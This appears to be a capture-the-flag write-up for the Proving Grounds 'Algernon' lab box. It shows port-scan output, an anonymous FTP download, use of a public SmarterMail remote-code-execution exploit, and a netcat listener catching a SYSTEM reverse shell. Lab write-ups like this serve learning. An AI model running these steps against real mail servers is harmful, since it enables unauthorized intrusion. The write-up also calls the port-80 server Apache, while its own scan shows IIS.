---
layout: post
title: PG | Algernon
subtitle: Algernon sure is a clever one.
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 07:42:49 UTC
Nmap scan report for 192.168.182.65
Host is up, received user-set (0.015s latency).
Scanned at 2023-10-16 07:42:49 EDT for 559s
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 10-16-23  04:41AM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5040/tcp  open  unknown       syn-ack
9998/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Mon, 16 Oct 2023 11:51:53 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 9D7294CAAB5C2DF4CD916F53653714D5
17001/tcp open  remoting      syn-ack MS .NET Remoting services
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-16T11:51:56
|_  start_date: N/A
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18291/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31424/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 42389/udp): CLEAN (Timeout)
|   Check 4 (port 5332/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 559.07 seconds
~~~

# Service Enumeration

## FTP (TCP/21)

The target is hosting an FTP server that allows anonymous connections, after downloading all available files there were a series of log files, however after searching through them they did not grant us any useful information to further us.

~~~shell
┌──(kali㉿kali)-[~/…/Algernon/results/192.168.175.65/scans]
└─$ wget -m --no-passive ftp://anonymous:anonymous@192.168.182.65 
~~~

![Algernon](/assets/img/AlgernonPG(1).png)

## HTTP (TCP/80)

An Apache web server is running on port 80

![Algernon](/assets/img/AlgernonPG(2).png)

I ran a sub-directory fuzzing scan and checked the webpages source code, but neither revealed anything of use

## HTTP (TCP/9998)

A SmarterMail web mail server is being hosted on port 9998 on the target machine where we are prompted for login credentials, the default SmarterMail credentials admin:admin failed

![Algernon](/assets/img/AlgernonPG(3).png)

I searched for exploits for SmarterMail and found a Remote Code Execution (RCE) exploit

![Algernon](/assets/img/AlgernonPG(4).png)

I copied the exploit to my current directory, then changed the target IP and local IP/Port for the shell (I used port 445 to avoid firewall restrictions as it is used for SMB)

~~~shell
┌──(kali㉿kali)-[~/Desktop/Algernon]
└─$ cp /usr/share/exploitdb/exploits/windows/remote/49216.py .
~~~

![Algernon](/assets/img/AlgernonPG(5).png)

I started a netcat listener on port 445

~~~shell
┌──(kali㉿kali)-[~/Desktop/Algernon]
└─$ nc -nvlp 445 
listening on [any] 445 ...
~~~

I ran the exploit and recieved a root (system) shell!

~~~shell
┌──(kali㉿kali)-[~/Desktop/Algernon]
└─$ nc -nvlp 445 
listening on [any] 445 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.182.65] 49952
whoami
nt authority\system
PS C:\Windows\system32> 
~~~